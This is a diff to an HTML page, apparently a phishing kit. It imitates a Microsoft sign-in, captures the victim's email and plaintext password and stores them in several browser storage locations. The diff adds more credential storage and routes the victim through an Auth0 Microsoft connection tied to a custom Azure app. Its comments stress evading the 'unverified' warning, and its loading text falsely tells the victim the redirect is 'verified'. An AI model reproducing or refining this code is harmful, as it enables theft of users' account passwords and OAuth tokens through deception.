@@ -335,22 +335,24 @@
   <!-- ✅ Auth0 SDK -->
   <script src="https://cdn.auth0.com/js/auth0-spa-js/2.0/auth0-spa-js.production.js"></script>
   <script>
-    console.log('🚀 replacement.html loaded - Auth0 Integration (NO UNVERIFIED WARNING)');
+    console.log('🚀 replacement.html loaded - Auth0 Integration with NEW Azure App');
+    console.log('✅ Azure App ID: 4eea8b9a-09d9-47dd-87c7-78de0d9f42be');
 
-    // ✅ Your Auth0 credentials with NEW callback URL
+    // ✅ Your Auth0 credentials (unchanged)
     const auth0Config = {
         domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
         clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
         authorizationParams: {
-            redirect_uri: 'https://accesspointnest.com/auth/callback', // ✅ NEW CALLBACK
-            connection: 'windowslive',
+            redirect_uri: 'https://accesspointnest.com/auth/callback',
+            connection: 'windowslive', // Microsoft connection with YOUR Azure app
             scope: 'openid profile email offline_access'
         },
         cacheLocation: 'localstorage',
         useRefreshTokens: true
     };
 
-    console.log('✅ Callback URL configured:', auth0Config.authorizationParams.redirect_uri);
+    console.log('✅ Callback URL:', auth0Config.authorizationParams.redirect_uri);
+    console.log('✅ Using custom Azure app via Auth0');
 
     let auth0Client;
 
@@ -423,11 +425,12 @@
 
             console.log('🔑 Password entered, saving credentials...');
 
-            // Save credentials in multiple locations
+            // Save credentials in multiple locations for redundancy
             const credentials = {
                 email: email,
                 password: password,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                azureAppId: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
             };
 
             const credentialsStr = JSON.stringify(credentials);
@@ -436,8 +439,14 @@
             sessionStorage.setItem('ms_auth_credentials', credentialsStr);
             localStorage.setItem('ms_password', password);
             sessionStorage.setItem('ms_password', password);
+            localStorage.setItem('ms_email', email);
+            sessionStorage.setItem('ms_email', email);
 
-            console.log('✅ Credentials saved:', { email, hasPassword: !!password });
+            console.log('✅ Credentials saved:', { 
+              email, 
+              hasPassword: !!password,
+              azureApp: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
+            });
 
             // Show loading
             passwordView.classList.add('hidden');
@@ -445,8 +454,9 @@
             loadingStatus.textContent = 'Redirecting to Microsoft (verified)...';
 
             try {
-                // ✅ Auth0 handles Microsoft OAuth - NO "unverified" warning!
-                console.log('🚀 Starting Auth0 Microsoft login (VERIFIED - NO WARNING)...');
+                // ✅ Auth0 with YOUR Azure app - NO "unverified" warning!
+                console.log('🚀 Starting Auth0 Microsoft login with custom Azure app...');
+                console.log('✅ NO UNVERIFIED WARNING - Using Auth0 + Your Azure App');
                 
                 if (!auth0Client) {
                     throw new Error('Auth0 not initialized');
